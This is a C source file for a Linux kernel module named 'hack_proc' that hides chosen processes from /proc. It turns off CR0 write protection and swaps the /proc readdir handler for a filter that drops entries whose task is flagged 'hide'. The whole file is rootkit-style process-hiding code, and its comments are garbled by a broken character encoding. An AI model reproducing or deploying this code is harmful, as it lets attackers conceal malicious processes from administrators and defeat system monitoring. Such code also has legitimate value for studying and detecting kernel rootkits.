#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/file.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("CHS");
typedef int (*readdir_t)(struct file*, void *, filldir_t); 
readdir_t orig_proc_readdir = NULL;
filldir_t proc_filldir = NULL; 
/* ���ַ���ת��Ϊ������ʧ�ܷ���-1���ɹ����ش���-1������ */
int my_atoi(char * name)
{
	char *ptr;
	int tmp, pid = 0;
	int mul = 1;
	for (ptr = name + strlen(name) - 1; ptr >= name ; ptr--) {
		tmp = *ptr - '0';	
		if (tmp < 0 || tmp > 9) {
			pid = -1;
			break;
		}
		pid += tmp * mul;
		mul *= 10;	
	}
	return pid;
}
/* ���һ�������Ƿ�Ҫ������ */
int is_invisible(int pid)
{	
	int res = 0;
	if (pid >= 0)  {//is a process		
		struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);
		if (task != NULL) {
			res = task->hide;//1 for invisible, 0 for visible
		}
	}
	return res;
}
/* Ŀ¼��亯�� */
int hack_proc_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
    char abuf[128];
    memset(abuf, 0, sizeof(abuf));
    memcpy(abuf, name, nlen < sizeof(abuf) ? nlen:sizeof(abuf)-1);
    if (is_invisible(my_atoi(abuf))) //should be hidden
       return 0;
    return proc_filldir(buf, name, nlen, off, ino, x);
}
/* Ŀ¼��ȡ����  */
int hack_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
    int r=0;
    proc_filldir = filldir;
    r = orig_proc_readdir(fp, buf, hack_proc_filldir);
    return r;
}
/* �ر�д���� */ 
inline unsigned long disable_wp()
{
       unsigned long cr0;
       preempt_disable();
       barrier();
       cr0 = read_cr0();
       write_cr0(cr0 & ~X86_CR0_WP);
       return cr0;
}
/* �ָ�д����  */
inline void restore_wp(unsigned long cr0)
{
       write_cr0(cr0);
       barrier();
       preempt_enable_no_resched();
}
/* �滻proc�ļ�ϵͳ�ص����� */ 
int patch_proc(readdir_t *orig_readdir, readdir_t new_readdir)
{
    struct file_operations *new_op;
    struct file *filep;
    /* ��/procĿ¼ */
    filep = filp_open("/proc", O_RDONLY, 0);
    if (IS_ERR(filep)) {
       printk(KERN_ALERT"cannot open file!\n");
       return -1;
    }
    if (orig_readdir)
       *orig_readdir = filep->f_op->readdir;
    /* �滻proc�ļ�ϵͳָ�� */ 
    new_op = filep->f_op;
    new_op->readdir = new_readdir;
    filep->f_op = new_op;
    filp_close(filep, 0);
    return 0;
}                                
/* �ָ�proc�ļ�ϵͳ�ص����� */
int unpatch_proc(readdir_t orig_readdir)
{
    struct file_operations *new_op;
    struct file *filep;
    /* ��/procĿ¼ */
    filep = filp_open("/proc", O_RDONLY, 0);
    if (IS_ERR(filep)) {
       printk(KERN_ALERT"cannot open file!\n");
       return -1;
    } 
    /* �ָ��ļ�ϵͳָ�� */
    new_op = filep->f_op;
    new_op->readdir = orig_readdir;
    filep->f_op = new_op;
    filp_close(filep, 0);
    return 0;      
} 
/* ģ���ʼ������ */
static int __init hack_proc_init(void)
{
       unsigned long orig_cr0 = disable_wp();
       patch_proc(&orig_proc_readdir, hack_proc_readdir);
       restore_wp(orig_cr0);
       printk(KERN_ALERT"Patch vfs done.\n");
       return 0;
}
/* ģ�������� */
static void __exit hack_proc_exit(void) 
{
       unsigned long orig_cr0 = disable_wp();
       unpatch_proc(orig_proc_readdir);
       restore_wp(orig_cr0);
       printk(KERN_ALERT"Unpatch vfs done.\n");
       return;
}
module_init(hack_proc_init);
module_exit(hack_proc_exit); 